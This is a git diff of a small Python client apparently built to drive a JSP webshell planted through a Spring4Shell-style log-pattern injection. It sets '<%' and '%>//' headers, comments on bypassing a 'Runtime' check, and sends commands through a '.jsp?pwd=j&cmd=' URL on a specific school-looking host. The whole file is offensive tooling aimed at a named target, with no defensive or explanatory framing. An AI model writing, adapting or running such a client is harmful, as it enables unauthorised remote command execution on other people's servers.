@@ -1,15 +1,17 @@
 import requests
 
+from hack import password
+
 class Sender:
     def __init__(self):
-        self.door = None
+        self.door = password.door
         self.get_headers = {
             "prefix": "<%",
             "suffix": "%>//",
             # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
             "c": "Runtime",
         }
-        self.url = r"http://js.bischofberger.schule:18080/" + self.door + ".jsp?pwd=j&cmd="
+        self.url = r"http://js.bischofberger.schule:18080/" + str(self.door) + ".jsp?pwd=j&cmd="
 
         self.current_path = ""
 
